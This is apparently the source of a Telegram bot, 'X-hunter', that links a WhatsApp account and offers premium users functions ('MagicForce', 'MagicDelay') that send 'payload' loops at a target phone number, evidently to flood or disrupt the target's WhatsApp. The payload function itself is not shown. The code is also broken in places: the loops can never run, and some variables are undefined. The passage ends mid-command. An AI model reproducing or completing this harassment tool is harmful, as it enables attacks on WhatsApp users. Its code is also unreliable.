// PROJECT BY @FadzxGanteng #NO APUS CREDIT 

const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const mongoose = require("mongoose");
const { BOT_TOKEN, ID_TELEGRAM } = require("./config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

// ------ ( Link Raw Github ) ------ //
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/fadzx512/DbHunter/refs/heads/main/Hunter.json";

// ------ ( Create Safe Sock ) ------ //
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

// ------ ( Pengecekan Token ) ------ //
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);

    if (Array.isArray(response.data)) {
      return response.data;
    }

    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens;
    }

    const raw = JSON.stringify(response.data || "");
    const extracted = raw.match(/\d{5,}:[A-Za-z0-9_\-]{20,}/g);

    return extracted || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.green("🔍 Memeriksa token anda"));

  let validTokens = await fetchValidTokens();

  if (!Array.isArray(validTokens)) {
    validTokens = [];
  }

  const tokenList = validTokens.map(t => String(t).trim());

  // Normalisasi token BOT lu
  const normalizedBotToken = String(BOT_TOKEN).trim();

  // cek token
  if (!tokenList.includes(normalizedBotToken)) {
    console.log(chalk.red(`
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⬡═―—―――――――――――――—═⬡⠀⠀⠀
❌ Akses Telah Di Tolak ❌
Alasan: Bot Token lu Belum Ke Daftar Dongo 😹
⬡═―—―――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀
`));
    process.exit(1);
  }

  console.log(chalk.green(`✅ Alhamdulillah, token valid!`));
  startBot();
}



function startBot() {
  console.log(chalk.red(`
           
     ⣿⣦⡀⠀⠀⠀⠀⢀⡄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⡿⠻⢶⣤⣶⣾⣿⠁⠀⢽⣆⡀⢀⣴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣀⣽⠉⠀⠀⠀⣠⣿⠃⠀⠀⢀⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠴⣾⣿⣀⣀⠀⠀⠈⠉⢻⣦⡀⠚⠻⠿⣿⣿⠿⠛⠂⠀⠀⢀⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⢻⣇⠀⣾⣿⣿⣿⣿⣤⠀⠀⣿⠁⠀⠀⠀⢀⣴⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣷⠏⠀⢀⠀⠀⠿⣶⣤⣤⣤⣄⣀⣴⣿⣿⢿⣿⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠟⠁⠀⢀⣾⠀⠀⠀⠩⣿⣿⠿⠿⠿⡿⠋⠀⠘⣿⣿⡆⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢳⣶⣶⣿⣿⣅⠀⠀⠀⠙⣿⣆⠀⠀⠀⠀⠀⠀⠛⠿⣿⣮⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⣹⣿⣿⣿⣿⠿⠋⠁⠀⣹⣿⠳⠀⠀⠀⠀⠀⠀⢀⣤⣽⣿⣿⠟⠋
⠀⠀⠀⠀⠀⣴⠿⠛⠻⢿⣿⠀⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⣾⣿⠟⠋⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣰⣿⣿⣿⣿⣿⣿⣷⣄⢀⣿⣿⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠉⠁⠀⠀⠀⠀⠙⢿⣿⣿⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀
`));
console.log(chalk.blue(`» Information:
☇ Creator : @FadzxGanteng
☇ Name Script : X-hunter 
☇ Version : 15.7 Latest⠀⠀⠀⠀⠀⠀⠀
`));
}
validateToken();

//----------(FORMAT TARGET)-------------//
function formatTarget(number) {
  if (!number) return null;

  // bersihin selain angka
  number = number.replace(/[^0-9]/g, "");

  if (number.startsWith("0")) {
    number = "62" + number.slice(1);
  }

  return number + "@s.whatsapp.net";
}

//------------------(TASK QUE SYSTEM)--------------------//
class TaskQueue {
  constructor() {
    this.queue = [];
    this.running = false;
  }

  async add(task) {
    this.queue.push(task);
    this.run();
  }

  async run() {
    if (this.running) return;
    this.running = true;

    while (this.queue.length > 0) {
      const job = this.queue.shift();
      try {
        await job();
      } catch (e) {
        console.error("Task error:", e);
      }
    }

    this.running = false;
  }
}

const queue = new TaskQueue();

//------------------(FILTER - BEBAS SPAM)--------------------//
async function MagicForce(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 3000;
  const totalLoops = 3; // Variabel biar gampang ubahnya cuma di satu tempat

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();

  // Header Simple
  console.log(`${C.cyan}${C.bold}[#] JOB TELAH DITERIMA | ID: ${taskId}${C.reset}`);
  console.log(`${C.gray}Target: ${target}${C.reset}`);

  for (let i = 10; i <= totalLoops; i++) {
    const loopStart = Date.now();

    try {
      // Pastikan fungsi epcihDiley sudah terdefinisi di tempat lain
      await VnFDelayInvisble(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.green}✓${C.reset} Payload Berhasil Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.red}✗${C.reset} Payload Gagal Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset} ${C.red}err:${C.reset} ${err.message}`);
    }

    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`${C.cyan}${C.bold}[!] JOB TELAH SELESAI | Time: ${totalTime}s${C.reset}\n`);
}

async function MagicDelay(ctx, target) {
  const taskId = Date.now().toString().slice(-6);
  const delay = 3000;
  const totalLoops = 3; // Variabel biar gampang ubahnya cuma di satu tempat

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();

  // Header Simple
  console.log(`${C.cyan}${C.bold}[#] JOB TELAH DITERIMA | ID: ${taskId}${C.reset}`);
  console.log(`${C.gray}Target: ${target}${C.reset}`);

  for (let i = 10; i <= totalLoops; i++) {
    const loopStart = Date.now();

    try {
      // Pastikan fungsi epcihDiley sudah terdefinisi di tempat lain
      await VnFDelayInvisble(sock, target);

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.green}✓${C.reset} Payload Berhasil Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset}`);

    } catch (err) {
      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);
      console.log(`${C.red}✗${C.reset} Payload Gagal Loop ${i}/${totalLoops} ${C.gray}(${duration}s)${C.reset} ${C.red}err:${C.reset} ${err.message}`);
    }

    if (i < totalLoops) await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
  console.log(`${C.cyan}${C.bold}[!] JOB TELAH SELESAI | Time: ${totalTime}s${C.reset}\n`);
}

const bot = new Telegraf(BOT_TOKEN);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const startSesi = async () => {
console.clear();
    console.log(chalk.cyan(`
─────────────────────
BOT SUCCEES TERHUBUNG
» Information:
☇ Creator : @FadzxGanteng
☇ Name Script : X-hunter 
☇ Version : 15.7 Latest⠀⠀⠀⠀⠀⠀⠀
─────────────────────
`));
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `\`\`\`JS
⿻𝐗-𝐡𝐮𝐧𝐭𝐞𝐫⿻ 

» Pairing Code:
☇ number: ${lastPairingMessage.phoneNumber}
☇ Code: ${lastPairingMessage.pairingCode}
☇ Status : sudah connect 
────────────────────
© 𝐗-𝐡𝐮𝐧𝐭𝐞𝐫\`\`\``;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.green(`PAIRING SENDER BERHASIL ✅`));
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();


bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "XHUNTERR");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`JS
⿻𝐗-𝐡𝐮𝐧𝐭𝐞𝐫⿻ 

» Pairing Code:
☇ number: ${lastPairingMessage.phoneNumber}
☇ Code: ${lastPairingMessage.pairingCode}
☇ Status : belum connect 
────────────────────
© 𝐗-𝐡𝐮𝐧𝐭𝐞𝐫
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(FotoUtama, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`JS
⿻𝐗-𝐡𝐮𝐧𝐭𝐞𝐫⿻ 

» Pairing Code:
☇ number: ${lastPairingMessage.phoneNumber}
☇ Code: ${lastPairingMessage.pairingCode}
☇ Status : sudah connect 
────────────────────
© 𝐗-𝐡𝐮𝐧𝐭𝐞𝐫\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

// ------ ( Function RunTime ) ------ //
function runtime(seconds) {
  seconds = Number(seconds);

  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor((seconds % (3600 * 24)) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);

  const parts = [];
  if (d > 0) parts.push(`${d}d`);
  if (h > 0) parts.push(`${h}h`);
  if (m > 0) parts.push(`${m}m`);
  parts.push(`${s}s`);

  return parts.join(" ");
}

// ------ ( Setup File Premium ) ------ //
const PREMIUM_FILE = "./premium.json";

function loadPremium() {
  if (!require("fs").existsSync(PREMIUM_FILE)) {
    require("fs").writeFileSync(PREMIUM_FILE, JSON.stringify({}, null, 2));
  }
  return JSON.parse(require("fs").readFileSync(PREMIUM_FILE));
}

function savePremium(data) {
  require("fs").writeFileSync(PREMIUM_FILE, JSON.stringify(data, null, 2));
}

let premiumDB = loadPremium();

// ------ ( Setup File Admin ) ------ //
const ADMIN_FILE = "./admin.json";

function loadAdmin() {
  if (!require("fs").existsSync(ADMIN_FILE)) {
    require("fs").writeFileSync(ADMIN_FILE, JSON.stringify({}, null, 2));
  }
  return JSON.parse(require("fs").readFileSync(ADMIN_FILE));
}

function saveAdmin(data) {
  require("fs").writeFileSync(ADMIN_FILE, JSON.stringify(data, null, 2));
}

let adminDB = loadAdmin();

// ------ ( Helper Admin ) ------ //
function isAdmin(userId) {
  return !!adminDB[userId];
}

function addAdmin(userId) {
  adminDB[userId] = true;
  saveAdmin(adminDB);
}

function delAdmin(userId) {
  delete adminDB[userId];
  saveAdmin(adminDB);
}

function isOwnerOrAdmin(userId) {
  return userId == ID_TELEGRAM || isAdmin(userId);
}

// ------ ( Helper Premium ) ------ //
function isPremium(userId) {
  return !!premiumDB[userId];
}

function addPremium(userId, expired) {
  premiumDB[userId] = expired;
  savePremium(premiumDB);
}

function delPremium(userId) {
  delete premiumDB[userId];
  savePremium(premiumDB);
}

function getPremiumExpire(userId) {
  return premiumDB[userId] || null;
}

// ------ ( Format Waktu Premium ) ------ //
function addDays(days) {
  return Date.now() + days * 24 * 60 * 60 * 1000;
}

function formatDate(ms) {
  const d = new Date(ms);
  return d.toLocaleString("id-ID");
}

// ------ ( Helper Untuk Menu ) ------ //
function getPremiumStatus(userId) {
  if (!isPremium(userId)) return "No";

  const exp = getPremiumExpire(userId);

  if (Date.now() > exp) {
    delPremium(userId);
    return "Expired";
  }

  return "Active";
}

// ------ ( Auto Hapus Expired ) ------ //
setInterval(() => {
  for (let user in premiumDB) {
    if (Date.now() > premiumDB[user]) {
      delete premiumDB[user];
    }
  }
  savePremium(premiumDB);
}, 60000);

// ------ ( Helper Cek Premium ) ------ //
function checkPremium() {
  return async (ctx, next) => {
    const userId = String(ctx.from.id);
    const exp = premiumDB[userId];

    if (!exp) {
      return ctx.reply(
        `<b>ACCESS DENIED</b>\n` +
        `❌ Kamu bukan user premium`,
        { parse_mode: "HTML" }
      );
    }

    if (Date.now() > exp) {
      delete premiumDB[userId];
      savePremium(premiumDB);

      return ctx.reply(
        `<b>PREMIUM EXPIRED</b>\n` +
        `⚠️ Masa aktif kamu sudah habis`,
        { parse_mode: "HTML" }
      );
    }

    return next();
  };
}

// ------ ( Helper Check Pairing Sender ) ------ //
const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

// ========== FIX: checkOwner middleware ==========
const checkOwner = async (ctx, next) => {
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik", { reply_to_message_id: ctx.message?.message_id });
  }
  return next();
};

// --- middleware owner only ---
const ownerOnly = () => async (ctx, next) => {
  if (!ctx.from) return;
  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik", { reply_to_message_id: ctx.message?.message_id });
  }
  return next();
};

// ================= AUTO FIX FUNCTION ================= //
function autoFixJS(code) {
  let fixed = code;

  // 1. hapus koma berlebih
  fixed = fixed.replace(/,\s*([}\]])/g, "$1");

  // 2. tambah ; sederhana
  fixed = fixed.replace(/([^\n;{}])\n/g, "$1;\n");

  // 3. balance kurung {}
  let open = (fixed.match(/{/g) || []).length;
  let close = (fixed.match(/}/g) || []).length;

  while (close < open) {
    fixed += "\n}";
    close++;
  }

  // 4. balance ()
  let o = (fixed.match(/\(/g) || []).length;
  let c = (fixed.match(/\)/g) || []).length;

  while (c < o) {
    fixed += ")";
    c++;
  }

  return fixed;
}

// ------ ( Command Hapus Sesi ) ------ //
bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ID_TELEGRAM) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

// ------ ( Command Add Admin ) ------ //
bot.command("addadmin", async (ctx) => {
  try {
    if (ctx.from.id != ID_TELEGRAM) {
      return ctx.reply("❌ Hanya Owner yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);
    let targetId;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply("❌ Format: /addadmin (reply)\n/addadmin 123456");
    }

    targetId = String(targetId);

    addAdmin(targetId);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝘼𝙙𝙢𝙞𝙣
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚 
\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("ADD ADMIN ERROR:", err);
    ctx.reply("❌ Error addadmin");
  }
});

// ------ ( Command Del Admin ) ------ //
bot.command("deladmin", async (ctx) => {
  try {
    if (ctx.from.id != ID_TELEGRAM) {
      return ctx.reply("❌ Hanya Owner yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);
    let targetId;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply("❌ Format:\n/deladmin (reply)\n/deladmin 123456");
    }

    targetId = String(targetId);

    delAdmin(targetId);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙜𝙝𝙖𝙥𝙪𝙨 𝘼𝙙𝙢𝙞𝙣
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚
\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("DEL ADMIN ERROR:", err);
    ctx.reply("❌ Error deladmin");
  }
});

// ------ ( Command Add Premium ) ------ //
bot.command("addprem", async (ctx) => {
  try {
    if (!isOwnerOrAdmin(ctx.from.id)) {
      return ctx.reply("❌ Hanya Owner & Admin yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);

    let targetId;
    let days;

    // mode reply
    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
      days = parseInt(args[0]);
    } 
    // mode ID manual
    else {
      targetId = args[0];
      days = parseInt(args[1]);
    }

    if (!targetId || !days) {
      return ctx.reply(
        "❌ Format salah Contoh :\n" +
        "Reply: /addprem 30\n" +
        "ID: /addprem 123456789 30"
      );
    }

    const expired = Date.now() + days * 86400000;

    premiumDB[targetId] = expired;
    savePremium(premiumDB);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙋𝙧𝙚𝙢𝙞𝙪𝙢
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙈𝙖𝙨𝙖 𝘼𝙠𝙩𝙞𝙛 : ${days} 
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("ADD PREMIUM ERROR:", err);
    ctx.reply("❌ Error addpremium");
  }
});

// ------ ( Command Del Premium ) ------ //
bot.command("delprem", async (ctx) => {
  try {
    if (!isOwnerOrAdmin(ctx.from.id)) {
      return ctx.reply("❌ Hanya Owner & Admin yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);

    let targetId;

    // mode reply
    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } 
    // mode ID
    else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply(
        "❌ Format salah Contoh :\n" +
        "Reply: /delprem\n" +
        "ID: /delprem 123456789"
      );
    }

    if (!premiumDB[targetId]) {
      return ctx.reply("❌ User bukan premium");
    }

    delete premiumDB[targetId];
    savePremium(premiumDB);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙜𝙝𝙖𝙥𝙪𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.log("DEL PREMIUM ERROR:", err);
    ctx.reply("❌ Error delpremium");
  }
});

// ------ ( Command Cek Premium ) ------ //
bot.command("checkprem", async (ctx) => {
  const target = ctx.message.reply_to_message
    ? ctx.message.reply_to_message.from
    : ctx.from;

  if (!isPremium(target.id)) {
    return ctx.reply("❌ User bukan premium");
  }

  const expired = getPremiumExpire(target.id);

  return ctx.reply( `\`\`\`JS
